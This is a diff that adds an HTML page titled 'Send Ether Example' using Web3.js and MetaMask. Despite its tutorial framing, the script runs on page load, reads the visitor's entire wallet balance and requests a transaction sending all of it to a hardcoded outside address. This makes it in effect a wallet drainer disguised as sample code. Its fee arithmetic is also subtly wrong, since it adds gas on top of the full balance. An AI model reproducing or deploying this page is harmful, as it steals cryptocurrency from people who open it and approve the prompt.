@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Ether Example</title>
+</head>
+<body>
+
+<!-- Include Web3.js from CDN -->
+<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+
+<script>
+  // Wait for the window to load before interacting with Ethereum
+  window.onload = async function () {
+    // Check if Web3 is available
+    if (typeof window.web3 !== 'undefined') {
+      // Web3 is available, use the current provider
+      window.web3 = new Web3(window.web3.currentProvider);
+      console.log('Web3 is connected to the provider:', window.web3.currentProvider);
+
+      window.ethereum.request({ method: 'eth_requestAccounts' })
+      .then((accounts) => {
+        let account = accounts[0];
+        console.log('Connected to MetaMask:', account);
+            // Construct a transaction to send Ether from User A to User B
+
+                // Replace with your Ethereum addresses
+                const senderAddress = account;
+                const recipientAddress = web3.utils.toHex('0xE08096BF8797eF6041b8a7746869CAdc6a1687B9');
+
+                // Get the current balance of the wallet
+                web3.eth.getBalance(accounts[0])
+                .then((balance) => {
+                    // Convert the balance from Wei to Ether
+                    const etherBalance = web3.utils.fromWei(balance, 'ether');
+
+                    // Set the amount to send to the entire wallet balance
+                    const amountToSend = etherBalance;
+
+                    // Estimate gas price (you may retrieve this dynamically from the network)
+                    const gasPrice = web3.utils.toWei('10', 'gwei'); // Example gas price: 10 Gwei
+
+                    // Estimate gas limit (you may use web3.eth.estimateGas for a more accurate estimate)
+                    const gasLimit = 21000; // Example gas limit: 21,000 (standard for simple transactions)
+
+                    // Calculate the total transaction value (including gas fee)
+                    const totalValue = web3.utils.toWei(amountToSend.toString(), 'ether');
+                    const totalGasFee = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit));
+                    const totalTransactionValue = web3.utils.toBN(totalValue).add(totalGasFee);
+
+                    // Construct the transaction object
+                    const transaction = {
+                    from: senderAddress,
+                    to: recipientAddress,
+                    value: totalTransactionValue.toString(),
+                    gas: gasLimit,
+                    gasPrice: gasPrice,
+                    };
+
+                    // Request user approval to send the transaction
+                    window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transaction],
+                    })
+                    .then((transactionHash) => {
+                    console.log('Transaction sent. Transaction Hash:', transactionHash);
+
+                    // You can listen for transaction confirmation events here
+                    })
+                    .catch((error) => {
+                    console.error('Error sending transaction:', error);
+                    });
+                })
+                .catch((error) => {
+                    console.error('Error getting wallet balance:', error);
+                });
+                            
+      })
+      .catch((error) => {
+        console.error('MetaMask connection error:', error);
+      });
+  
+  
+    } else {
+      // Web3 is not available, provide a fallback or prompt the user to install MetaMask
+      console.error('Web3 is not available. Please install MetaMask or use a compatible Ethereum browser.');
+    }
+  };
+</script>
+
+</body>
+</html>
